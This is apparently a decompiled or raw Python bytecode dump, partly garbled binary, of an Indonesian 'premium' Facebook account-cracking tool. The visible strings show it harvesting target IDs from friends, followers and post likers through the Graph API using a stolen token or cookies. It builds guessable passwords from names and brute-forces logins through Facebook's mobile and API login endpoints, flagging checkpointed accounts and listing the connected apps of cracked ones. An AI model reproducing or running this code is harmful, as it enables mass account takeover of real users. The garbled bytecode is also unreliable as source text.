o
    c�a!" �                   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZdZdZdZdZdZdZdZd	Zd d
lmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlm Z  d dlmZ d dl!m"Z" dZ#dZ$g Z%g Z&g Z'e�(� Z)e)j*Z+e)j,Z-e)j.Z/ddddddddddddd �Z0g d!�Z1g d"�Z2ze-d k s�e-d#kr�e3�  e-d$ Z4W n e5y�   e3�  Y nw e1e4 Z6d%e/e6e+f Z7d&Z8d'Z9d(Z:d)Z;d*Z<d+Z=d,Z>d-Z?d.d/� Z@d0d1� ZAd2d3� ZBd4d5� ZCd6d7� ZDd8ZEeEd8k�reFd9�ZGeFd:�ZHeGd;k�reHd<k�reId=� d>ZEn	eId?� e�Jd@� eEd8ks�dAdB� ZKdCdD� ZLdEdF� ZMdGdH� ZNdIdJ� ZOdKdL� ZPdMdN� ZQdOdP� ZRdQdR� ZSdSdT� ZTdUdV� ZUdWdX� ZVdYdZ� ZWd[d\� ZXd]d^� ZYd_d`� ZZdadb� Z[dcdd� Z\dedf� Z]dgdh� Z^didj� Z_dkdl� Z2G dmdn� dn�Z`dodp� Zadqdr� Zbdsdt� Zcdudv� Zddwdx� Zedydz� Zfd{d|� Zgd}d~� Zhdd�� Zid�d�� Zjd�d�� Zkd�d�� Zld�d�� Zmd�d�� Zneod�k�r�e�Jd�� en�  eM�  e�3d � dS )��    Nz[0;97mz[0;91mz[0;92mz[0;93mz[0;94mz[0;95mz[0;96mz[0m)�
ThreadPool)�ThreadPoolExecutor)�ConnectionError)�Browser)�BeautifulSoup)�date)�datetime)�quotezKhttps://ngepetonline.000webhostapp.com/chek.php?project=testlicence&apikey=�https://mbasic.facebook.com�January�February�March�April�May�June�July�August�	September�October�November�December)�01�02�03�04�05�06�07�08�09Z10Z11Z12)r   r   r   r   r   r   r   r   r   r   r   r   )Z1987Z1988Z1989Z1999Z2000Z2001Z2002Z2003Z2004Z2005Z2006Z2007Z2008Z2009Z2010Z2011Z2012Z2013Z2014z 2015Z2016Z2017Z2018Z2019Z2020Z2021Z2022�   �   z%s-%s-%sz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]z�Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]z�Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]c                 C   �2   | d D ]}t j�|� t j��  t�d� qd S )N�
g{�G�z�?��sys�stdout�write�flush�time�sleep��z�e� r.   �test.py�jalan0   �
   
�r0   c                 C   r"   )Nr#   g���Q��?r$   r+   r.   r.   r/   �mlaku5   r1   r2   c                   C   sF   dt j�� v rt�d� d S dt j�� v rt�d� d S t�d� d S )NZlinux�clear�win�cls)r%   �platform�lower�os�systemr.   r.   r.   r/   r3   :   s   r3   c                 C   s
   t �  d S )N)�exit)r%   r.   r.   r/   �reload>   s   
r;   c                   C   s   t d� d S )Nai  
[1;97m
[1;97m      [1;96m
[1;97m[1;91m [1;97m- _ --_--[1;92m    
[1;97m [1;97m [1;97m_-_-- -_ --__[1;92m  
[1;97m[1;91m[1;97m--  - _ --[1;92m        [1;93mPREMIUM v2.1
[1;97m      [1;96m
[1;97m  
[1;97m
[1;97m[1;93m* [1;97mAuthor  [1;91m: [1;96mR[1;97m                    
[1;97m[1;93m* [1;97mGithub  [1;91m: [1;96m=> https://github.com/cyberJMB[1;97m   
[1;97m[1;93m*[1;97mPenghasil Uang[1;91m[1;92m[4mhttp://tiny.cc/penghasil_uang[0m   [1;97m
[1;97m[1;93m* [1;97mVersion [1;91m: [1;92m[4m2.1[0m                         [1;97m
[1;97m"
[1;33m[] SELAMAT MENIKMATI DUNIA PENCEPOTAN
)�printr.   r.   r.   r/   �banner@   s   r=   �truez"[1;92m[?][1;91mUSERNAME[1;95m:
z"[1;92m[?][1;91mPASSWORD[1;95m:
zMr.XZKhenah123456789z_[1;97m[][1;92m[][1;92mWelcome To my Tools[1;92m[][1;93mCosed by Mr.X[1;91m [][1;97m
�falsez![1;91mUsername & Password Salah
zxdg-open http://tiny.cc/MrXnxxc                   C   s   t �d� t�  d S )Nr3   )r8   r9   �loginr.   r.   r.   r/   �lisensiP   s   

rA   c                  C   s�  t �d� t�  t�  t�  tdttttf �} tdt � | dv r1t	dt
tt
tf � t�  d S | dv r�t�  tdttttf �}z8t�d| �}t�|j�}|d	 }td
d�}|�|� |��  tdt � t	dttttf � t�  t�  W d S  ttfy�   tdt � t	dt
tt
tf � t �d� t�  Y d S  tjjy�   tdt � t	dt
tt
tf � t�  Y d S w | dv �rjt�  tdttttf �}zUtjddddddddddd�	d|id�}t�d|j�}|d u r�dnd |�d!� }	td
d�}|�|�d!�� |��  tdt � t	dttttf � tt�� � t�  W d S  tjj�yD   tdt � t	dt
tt
tf � t�  Y d S  ttt f�yi   tdt � t	d"t
tt
tf � t �d� t�  Y d S w | d#v �rt�  t�  t!�  tdttttf �}
tdt � |
dv �r�t	d$t
tt
tf � t�  d S |
dv �r�t �d%� td&ttttf � t�  d S |
dv �r�t �d%� td&ttttf � t�  d S |
d#v �r�t �d%� t"�  td&ttttf � t�  d S |
d'v �rt#�  td&ttttf � t�  d S t	d$t
tt
tf � t�  d S | d'v �r-t�  t�  t$�  td&ttttf � t�  d S | d(v �rSt	d)ttttf � t	d*ttttf � t �d� t�  t�  d S t	d$t
tt
tf � t�  d S )+N�rm -rf token.txt�%s[%s%s] %sChoose : �%s�� z %s[%s!%s] %sFILL IN CORRECTLY��1r   �001�az%s[%s%s] %sToken : �+https://graph.facebook.com/me?access_token=�name�	token.txt�wz%s[%s!%s] %sLogin Successfulz%s[%s!%s] %sToken Invalid�!%s[%s!%s] %sConnection Problem��2r   �002�bz%s[%s%s] %sCookies : zGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_a  Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15F79 [FBAN/FBIOS;FBAV/179.0.0.50.82;FBBV/116150041;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4;FBSS/2;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/116408384]zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comrH   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	�
user-agent�referer�host�origin�upgrade-insecure-requests�accept-language�cache-control�accept�content-type�cookie)�headers�cookiesz	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r!   z%s[%s!%s] %sCookies Invalid��3r   Z003�c�$%s[%s!%s] %sIsi Yang Benar Anjingz@xdg-open https://www.facebook.com/profile.php?id=100077023201137�%s[ %sReturn %s]%s��4r   Z004�d)�0�00�000r-   z*%s[%s!%s] %sThank You For Using This SCz"%s[%s!%s] %sHave a Nice Day :)
)%r8   r9   r3   r=   �var_menu�input�O�Pr<   r0   �M�menu_log�	defaultua�requests�get�json�loads�text�openr'   �close�menur:   �KeyError�IOError�
exceptionsr   �re�search�groupZbot_follow_elite�main�AttributeError�	var_tutor�tutor_target�tutor_crackZ
var_author)�pmu�token�x�y�nZxdr`   �dataZ
find_token�hasil�pfr.   r.   r/   rs   T   s�   




�
���

�




















rs   c               	   C   s.  t �  t�  z\tdd��� } t�t|  �}t�|j	�}| �
d�}|d }|d �
d�}|d }|d }|d d	� }|d
 | }	|d }
|d }dtttf }dt|d tt|d ttf }d}d}W n% ttfy�   d}d}d}	d}d}
d}dtttf }dtttf }Y nw ztdd��� }t�d| �}t�|j	�}|d }|d }W nW ttfy�   tdttttf � tdt � tdttttf � t�d� t�  t�  Y n( tjjy�   tdttttf � tdt � tdttttf � t�  Y nw tjddddd�d ��� }z|d! }W n t�y   d"}Y nw td#tt|tf � tdt � td$tttt|f � td%tttt|f � tdt � td&tttt|f � td'tttt|f � td(tttt|	f � td)tttt|f � td*tttt|
f � td+tttt|f � tdt � td,tttt|f � td-tttt|f � td.tttt|f � td/ttttf � td0tttt|f � td1ttttf � td2tttt|f � td3ttttf � td4ttttf � td5ttttf �}tdt � |d6v �rtd7ttttf � t�  d S |d8v �rt�  d S |d9v �r)t�  d S |d:v �r3t�  d S |d;v �r=t�  d S |d<v �rGt�  d S |d=v �rQt�  d S |d>v �r[t �  d S |d?v �ret!�  d S |d@v �rot"�  d S |dAv �r�tdBttttf � t�d� t�  d S td7ttttf � t�  d S )CN�license.txt�r�-�username�email�@r   r!   �   zxxxxx@ZjoinedZexpiredz%sPremium [%sPro%s]z%s%s%s-%s%s%s-%sXXXXXrF   z%s[%sPro%s]z%s[%sMODED%s]rM   rK   rL   �idz%s[ %sOh %s]%srD   �$%s[%s!%s] %sToken/Cookies InvalidrB   rO   zhttp://ip-api.com/json/zhttp://ip-api.com/zapplication/json; charset=utf-8zRMozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0)ZRefererzContent-Typez
User-Agent�ra   �query� z%s[ %sWellcome %s %s]z%s[%s%s] %sID : %sz%s[%s%s] %sIP : %sz.%s[%s%s] %sStatus : Premium Seumur Hidup%sz%s[%s%s] %sName : MR. X%sz+%s[%s%s] %sEmail : nickname@gmail.com%sz!%s[%s%s] %sKey : aYaNk_Mr.X%sz"%s[%s%s] %sJoin Since : 2022%sz(%s[%s%s] %sValid until : Unlimited%sz#%s[%s1%s] %sCrack From Public %sz%%s[%s2%s] %sCrack From Follower %sz'%s[%s3%s] %sCrack From likes post %sz#%s[%s4%s] %sRetrieve Target Dataz*%s[%s5%s] %sTaking Number of Friends %sz"%s[%s6%s] %sCheck Crack Resultsz,%s[%s7%s] %sCheck Crack Result Options %sz%s[%s8%s] %sUser Agentz%s[%s0%s] %sLog OutrC   rE   rf   rG   rP   rc   rh   ��5r   Z005r-   )�6r   Z006�f)�7r   Z007�g)�8r   Z008�h)�9r   Z009�i)rk   rl   rm   �jz%s[%s!%s] %sSee you later)#r3   r=   rz   �readru   rv   �url_licenserw   rx   ry   �splitrp   rq   r}   r~   r<   rr   r0   r8   r9   rs   r:   r   r   ro   r|   �publik�pengikut�likers�target�teman_targetr�   �	cek_hasil�ugenZbuy_license)rA   �wl�wkZkunZusersZmailertsZmailert1Zmailert2ZmailerZmaileZ	bergabungZ
kadaluarsa�statusZkunci�pro�jidr�   r�   r�   r�   r�   rJ   �ipZpmr.   r.   r/   r|   �   s�   
�	


��























r|   c               	   C   sF   t } ztdd�}|�| � |��  W d S  ttfy"   t�  Y d S w )N�	ugent.txtrN   )�ua_nokiarz   r'   r{   r}   r~   rs   )�ua�ugentr.   r.   r/   rt   +  s   

�rt   c               	   C   sf  t �  tdttttf �} tdt � | dv r&tdttttf � t�  d S | dv r>t�	d� tdttttf � t�  d S | dv r�t�	d	� td
ttttf �}z-t
dd�}|�|� |��  tdtttf � tdt � tdttttf � t�  W d S  ttfy�   tdtttf � tdt � tdttttf � t�  Y d S w | dv r�t�  d S | dv r�t�	d	� tdtttf � tdt � tdttttf � t�  d S | dv �rz	t
dd��� }W n ttfy�   d}Y nw tdttttt|f � tdtttf � tdt � tdttttf � t�  d S | dv �r't�  d S tdttttf � d S )NrC   rD   rE   rf   rG   z�xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8�%s[ %sBack %s]%srP   �rm -rf ugent.txtz$%s[%s%s] %sEnter User Agent : 

r�   rN   z,
%s[ %sSuccesfully Changed User Agent %s]rg   z)
%s[ %sFailed to Change User Agent %s]rc   rh   z,%s[ %sUser Agent Deleted Successfully %s]r�   r�   z	Not Foundz(%s[%s%s] %sYour User Agent  : 

%s%sz-
%s[ %sThis is your current user agent %s])rk   rl   rm   r�   )�var_ugenro   rp   rq   r<   r0   rr   r|   r8   r9   rz   r'   r{   r}   r~   �ugen_hpr�   )r�   r�   r�   Zungserr.   r.   r/   r�   3  sb   





�



�


r�   c                  C   sv  t �d� tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � tdttttf � td	ttttf � td
ttttf �} tdt � | dv rwtdttttf � t�  n�| dv r�t	dd�}|�
t� |��  n�| dv r�t	dd�}|�
t� |��  n�| dv r�t	dd�}|�
t� |��  nm| dv r�t	dd�}|�
t� |��  nZ| dv r�t	dd�}|�
t� |��  nG| dv r�t	dd�}|�
t� |��  n4| dv r�t	dd�}|�
t� |��  n!| dv �rt	dd�}|�
t� |��  ntdttttf � t�  tdtttf � tdt � tdttttf � t�  d S )Nr�   z%s[%s1%s] %sXiaomiz%s[%s2%s] %sNokiaz%s[%s3%s] %sAsusz%s[%s4%s] %sHuaweiz%s[%s5%s] %sVivoz%s[%s6%s] %sOppoz%s[%s7%s] %sSamsungz%s[%s8%s] %sWindowsrC   rD   rE   z%s[%s!%s] %sIsi Yang Benar�rH   r   r�   rN   �rQ   r   �rd   r   �ri   r   )r�   r   )r�   r   )r�   r   )r�   r   z,%s[ %sSuccessfully Changed User Agent %s]r�   )r8   r9   r<   rp   rq   ro   r0   rr   r|   rz   r'   �	ua_xiaomir{   r�   �ua_asus�	ua_huawei�ua_vivo�ua_oppo�
ua_samsung�
ua_windows)Zpcr�   r.   r.   r/   r�   d  sB   
$

r�   c               
   C   s�  zt dd��� } t�t|  �}t�|j�}|d }d}W n$ tt	fy)   d}Y n tj
jy@   tdttttf � t�  Y nw zt dd��� }t�d| �}t�|j�}|d }W n4 tt	fyx   td	ttttf � t�d
� t�  Y n tj
jy�   tdttttf � t�  Y nw z�tdttttf � tdttttf �}	z t�d|	 d | �}
t�|
j�}tdtttt|d f � W n tt	fy�   tdt � tdttttf � t�  Y nw t�d|	||f �}g }t�|j�}|d d �dd�}t |d�}|d D ]}|�|d d |d  � |�|d d |d  d � �q	|��  tdttttt|�f � t|�W S  t�y] } ztdtttt|f � W Y d }~d S d }~ww )Nr�   r�   r�   �5000rO   rM   rK   rL   r�   rB   �%s[%s%s] %sINPUT ID�%s[%s%s] %sID Target : �https://graph.facebook.com/�?access_token=�%s[%s%s] %sName : %srD   �%s[%s!%s] %sID Not Found�>https://graph.facebook.com/%s/friends?limit=%s&access_token=%s�
first_name�.jsonr�   �_rN   r�   r�   �r#   �%s[%s%s] %sTotal ID : %s�%s[%s!%s] %sError : %s�rz   r�   ru   rv   r�   rw   rx   ry   r}   r~   r   r   r0   rr   rq   r:   r8   r9   rs   r<   rp   ro   r|   �replace�appendr'   r{   �len�crack�	Exception�rA   r�   r�   Zwjr�   r�   r�   r�   r�   �itZpb�obr�   r�   r,   Zxc�xbrJ   r-   r.   r.   r/   r�   �  �h   
�


�
�
"
$��r�   c               
   C   �  zt dd��� } t�t|  �}t�|j�}|d }d}W n$ tt	fy)   d}Y n tj
jy@   tdttttf � t�  Y nw zt dd��� }t�d| �}t�|j�}|d	 }W n4 tt	fyx   td
ttttf � t�d� t�  Y n tj
jy�   tdttttf � t�  Y nw z�tdttttf � tdttttf �}	z t�d|	 d | �}
t�|
j�}tdtttt|d	 f � W n tt	fy�   tdt � tdttttf � t�  Y nw t�d|	||f �}g }t�|j�}|d d �dd�}t |d�}|d D ]}|�|d d |d	  � |�|d d |d	  d � �q	|��  tdttttt|�f � t|�W S  t�y] } ztdtttt|f � W Y d }~d S d }~ww )Nr�   r�   r�   �10000r�   rO   rM   rK   rL   r�   rB   z%s[%s%s] %sInput ID r�   r�   r�   r�   rD   r�   zBhttps://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sr�   r�   r�   r�   rN   r�   r�   r�   r#   r�   r�   r�   r�   r.   r.   r/   r�   �  r�   r�   c               
   C   r�   )Nr�   r�   r�   r�   r�   rO   rM   rK   rL   r�   rB   r�   r�   r�   r�   r�   rD   r�   z<https://graph.facebook.com/%s/likes?limit=%s&access_token=%sr�   r�   r�   r�   rN   r�   r�   r�   r#   r�   r�   r�   r�   r.   r.   r/   r�   �  r�   r�   c                 C   s  g }| � d�D ]r}t|�dk rq|�� }t|�dks&t|�dks&t|�dkrJ|�|d � |�|d � |�|d � |�|d � |�|d	 � qt|�d
kry|�|� |�|d � |�|d � |�|d � |�|d � |�|d	 � qq|�| �� � |S )Nr�   �   �   �   �123�12345�1234�786�1122�   �r�   r�   r7   r�   ��_cucu_�_kanghacker_r�   r.   r.   r/   �	generate1  s*   $
r�   c                 C   s  g }| � d�D ]k}t|�dk rq|�� }t|�dks&t|�dks&t|�dkrJ|�|d � |�|d � |�|d � |�|d � |�|d	 � q|�|� |�|d � |�|d � |�|d � |�|d � |�|d	 � q|�| �� � |�d
� |�d� |�d� |S )Nr�   r�   r�   r�   r�   r�   r�   r�   r�   �pakistan�786786�khankhanr�   r�   r.   r.   r/   �	generate2.  s,   $



r�   c                 C   s4  g }| � d�D ]k}t|�dk rq|�� }t|�dks&t|�dks&t|�dkrJ|�|d � |�|d � |�|d � |�|d � |�|d	 � q|�|� |�|d � |�|d � |�|d � |�|d � |�|d	 � q|�| �� � |�d
� |�d� |�d� |�d� |�d� |�d� |S )Nr�   r�   r�   r�   r�   r�   r�   r�   r�   r�   Zpakistan123r�   r�   Z223344Zkhan1234r�   r�   r.   r.   r/   �	generate3G  s2   $






r�   c                 C   sx  g }t dd��� }t dd��� }| �d�D ]k}|�� }t|�dk r"qt|�dks4t|�dks4t|�dkrX|�|d � |�|d	 � |�|d
 � |�|d � |�|d � q|�|� |�|d � |�|d	 � |�|d
 � |�|d � |�|d � q|dv r�n| �d�D ]}|�� }|�d�D ]	}|�|| � q�q�|dv r�n|�d�D ]}|�|� q�|�| �� � |S )N�pass.txtr�   �passangka.txtr�   r�   r�   r�   r�   r�   r�   r�   r�   )rF   r�   z  �,)rz   r�   r�   r7   r�   r�   )r�   r�   Zps�ppr�   r�   r,   r.   r.   r/   �	generate4c  s:   $

�
r�   c                  C   sR   t dt � t dttttf � tdttttf �} tdd�}|�| � |j d S )NrD   z@%s[%s%s] %sFor Example :  pakistan,pakistan123,123456,786786z8%s[%s%s] %sMasukkan Pass Tambahan Manual [1 Kata] : r�   rN   �r<   rp   rq   ro   rz   r'   r{   )ZcuyZghr.   r.   r/   �tambah_pass�  s   


r�   c                  C   sF   t dttttf � tdttttf �} tdd�}|�| � |j d S )Nz-%s[%s%s] %sFor Example : 321,786,1122,123z3%s[%s%s] %sEnter Additional Pass Behind Name : r�   rN   r�   )ZcoyZxyr.   r.   r/   �tambah_pass_angka�  s
   


r�   c           	   
   C   s�   t dd��� }t�� }tt�dd��tt�dd��tt�dd��dd|d	d
d�}ddd| d|dddd�	}d}|j|||d�}d|jv rNd|jv rNd| |d�S d|�	� d v r\d| |d�S d| |d�S )Nr�   r�   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPA�!application/x-www-form-urlencodedZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typerW   r_   zx-fb-http-enginez/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32rw   rQ   �en_USZiosrH   Z 3f555f99fb61fcd7aa0c44f58f522ef6)	Zaccess_token�formatZsdk_versionr�   �locale�passwordZsdkZgenerate_session_cookies�sigz,https://b-api.facebook.com/method/auth.login)�paramsra   Zsession_keyZEAAA�success�r�   r�   �passzwww.facebook.comZ	error_msg�cp�error)
rz   r�   ru   �Session�str�random�randintrv   ry   rw   )	�em�pas�hostsr�   r�   �header�param�api�responser.   r.   r/   �log_api�  s8   ��	r  c                 C   �  t dd��� }t�� }|j�ddd|dddd	�� |�d
�}t�|j	d�}d�
tj�d|j	��}i }|d�D ]?}	|	�d�d u rh|	�d�dkrN|�d| i� q6|	�d�dkr]|�d|i� q6|�|	�d�di� q6|�|	�d�|	�d�i� q6|�|dddddddd�� |j�ddi� |jd|d�j	}
dt|j�� �� �v r�d| ||j�� d�S dt|j�� �� �v r�d| ||j�� d�S d| |d �S )!Nr�   r�   �mbasic.facebook.comrU   rH   rV   �gzip, deflaterT   ��Hostr]   r[   rW   r^   �accept-encodingr\   zhttps://mbasic.facebook.com/�html.parserrF   �dtsg":\{"token":"(.*?)"ro   �valuerL   r�   r	  rk   rj   ��fb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassrX   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100�r�   �c_userr  �r�   r�   r	  rb   �
checkpointr
  r  r  �rz   r�   ru   r  ra   �updaterv   �bs4r   ry   �joinr�   �findall�post�listrb   �get_dict�keys�r  r  r  r�   r�   �prS   �metar�   r�   Zpor.   r.   r/   �
log_mbasic�  �6   

��r3  c                 C   r  )!Nr�   r�   zfree.facebook.comrU   rH   rV   r  rT   r  zhttps://free.facebook.com/r  rF   r  ro   r   rL   r�   r	  rk   rj   r!  rX   z8https://free.facebook.com/login/?next&ref=dbl&fl&refid=8z|https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100r#  r$  r  r%  r&  r
  r  r  r'  r0  r.   r.   r/   �log_free�  r4  r5  c                 C   s*  d}d}t �� }|j�ddd|d|ddd	d
dd|d ddd�� i }t|j|d d|id�jd�}|�dddi�}g d�}	|�d�D ]}
|
�d�|	v rY|�|
�d�|
�d�i� qBqB|�| |d�� zt|j	||�d� |dd�jd�}W n t j
jy�   td� Y nw d |jv r�d!| |d"�S d#|jv �r	|�d�}|�ddd$i�d }|�ddd%i�d }|�ddd&i�d }||||d'd(|d)�}t|j	||d  |d*�jd�}d+d,� |�d-�D �}g }g }tt|��D ]}|�d.t t|d/ � d0 ||  d1 � q�t|d'�|� � d S d2t|�v �rd S 	 d S )3NzMMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0r
   r  rU   rH   r   �|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�navigate�?1�document�/login/?next&ref=dbl&fl&refid=8r  rT   �r  r]   r[   rZ   r_   rW   r^   zx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-destrX   r  r\   rW   r�   r  �form�methodr,  �Zlsd�jazoestZm_tsZliZ
try_numberZunrecognized_triesr@   Zbi_xrwhro   rL   r   �r�   r	  �actionT�r�   �allow_redirectsz[!] Redirect Overloadr$  r  r  r&  r"  rA  �nhrF   �	Lanjutkan�r"  r"  rA  rA  Zcheckpoint_datazsubmit[Continue]rF  r#  c                 S   �   g | ]}|j �qS r.   �ry   ��.0�yyr.   r.   r/   �
<listcomp>  �    zcek_log.<locals>.<listcomp>�optionz
     r!   �. r�   �login_error)ru   r  ra   r(  �parrv   ry   �find�find_allr,  r   �TooManyRedirectsr<   rb   �ranger�   r�   rq   r  r*  )�user�pasw�h_cpr�   �mb�sesr�   �ged�fmr-  r�   �runr>  �dtsg�jzstrF  �dataD�xnxx�ngewZopsiZ
option_dev�optr.   r.   r/   �cek_log�  sv   �&�

�	,rf  c                 C   s�   g }t | �� �D ]/}|d t| �� �d kr&|�|d d | |d   � q|�|d d | |d   d � qd�|�}|�dd�}|�d�}d|d	 |d |d |d
 |d f }|S )Nr   r!   �=z; rF   r�   �;z%s; %s; %s; %s; %sr�   r�   r�   )�	enumerater/  r�   r�   r*  r�   r�   )rb   �resultr�   �sampleZsam_Zsamp_�finalr.   r.   r/   �koki&  s   8$

&rm  c                 C   s�   g }t �� }d}|j|d|id�}t|jd�}|jddd�}|�d�D ]}z|�d	�j}	|�d
|	 � W q#   Y q#d}
|j|
d|id�}t|jd�}|jddd�}|�d�D ]}z|�d	�j}	|�d
|	 � W qW   Y qWt	| d�
|� � d S )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activer`   )rb   r  r>  r,  )r?  Zh3�spanz
    z>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactiverF   )ru   r  rv   rS  �contentrT  rU  ry   r�   r<   r*  )�h_okr�   �apkZses_�urlZdat_gameZdatagameZform_ZasuZcelengZurl2r.   r.   r/   �cek_apk0  s*   

rs  c                 C   s�  t | �dkr�| d d� dv rd}|S | d d� dv rd}|S | d d� dv r*d}|S | d d	� d
v r6d}|S | d d	� dv rBd}|S | d d� dv rNd}|S | d d� dv rZd}|S | d d� dv rfd}|S | d d� dv rrd}|S | d d� dv r~d}|S | d d� dv r�d}|S | d d� dv r�d}|S | d d� dv r�d}|S | d d� dv r�d }|S | d d� d!v r�d"}|S | d d� d#v r�d$}|S | d d� d%v r�d&}|S d'}|S t | �d(v r�d)}|S t | �dkr�d*}|S t | �d	kr�d+}|S d'}|S ),N�   �
   )Z
1000000000z  2009�	   )Z	100000000�   )Z10000000�   )Z1000000Z1000001Z1000002Z1000003Z1000004Z1000005)Z1000006Z1000007Z1000008Z1000009z  2010r�   )Z100001z  2010/2011)Z100002Z100003z  2011/2012)Z100004z  2012/2013)Z100005Z100006z  2013/2014)Z100007Z100008z  2014/2015)Z100009z  2015r�   )Z10001z  2015/2016)Z10002z  2016/2017)Z10003z  2018)Z10004z  2019)Z10005z  2020)Z10006Z10007Z10008z  2021rF   )rv  ru  z  2008/2009z  2007/2008z  2006/2007)r�   )ZfxZtahunzr.   r.   r/   �tahunF  s`   ���������������
�	�����ry  c                   @   sL   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dS )r�   c              
   C   s�  g | _ g | _d| _tdt � tdttttf � 	 tdttttf �}|dkr7tdttttf � t	�  �n@|dv r�zH	 z|| _
t| j
��� �� | _W qe tyd } ztd	| � W Y d }~q<d }~ww g | _| jD ]}z| j�d
|�d�d i� W qk   Y qkW n ty� } ztd	| � W Y d }~qd }~ww tdttttf � | ��  d S |dv �rw�z�	 z|| _
t| j
��� �� | _W q� ty� } ztd	| � W Y d }~q�d }~ww g | _t�  tdttttf �}|dv r�tdttttf � t	�  n�|dv �r(| jD ] }z| j�|�d�d t|�d�d �d�� W �q   Y �qn�|dv �rR| jD ] }z| j�|�d�d t|�d�d �d�� W �q0   Y �q0nq|dv �r|| jD ] }z| j�|�d�d t|�d�d �d�� W �qZ   Y �qZnG|dv �r�t�d� t�d� t�  t�  | jD ] }z| j�|�d�d t|�d�d �d�� W �q�   Y �q�ntdttttf � t	�  t�  tdttttf �}tdt � |dv �r�tdttttf � t	�  �nr|dv �ratdttttf � tdttttf �}|dv �rtdttttf � t	�  �q\|dv �r5t�  td�� | j!| j� t�"| j
� t#�  W d S |dv �rSt�  td�� | j$| j� t�"| j
� t#�  W d S tdttttf � t	�  n�|dv �r�tdttttf � tdttttf �}|dv �r�tdttttf � t	�  �q\|dv �r�t�  td�� | j%| j� t�"| j
� t#�  W d S |dv �r�t�  td�� | j&| j� t�"| j
� t#�  W d S tdttttf � t	�  n�|dv �rOtdttttf � tdttttf �}|dv �rtdttttf � t	�  �q\|dv �r#t�  td�� | j'| j� t�"| j
� t#�  W d S |dv �rAt�  td�� | j(| j� t�"| j
� t#�  W d S tdttttf � t	�  ntdttttf � t	�  W n t�yv } ztd	| � W Y d }~nd }~ww q)Nr   rD   z7%s[%s%s] %sCrack With Password Default/Manual [d/m]TrC   rF   rf   )�mrr   rQ   r   rR   z   %sr�   r�   z3%s[%s%s] %sFor example : Pakistan,786786,123456)rj   �DrH   r   rI   rE   r�   r!   )r�   �pwr�   r�   r�   zrm -rf pass.txtzrm -rf passangka.txtrG   z*%s[%s%s] %sBring Up  CP2 Option? [y/t]�rH   r   rI   r�   �Y�#   �rQ   r   rR   �t�TrP   rc   z)%s[%s%s] %sBring up CP2 Option? [y/t]))�adar
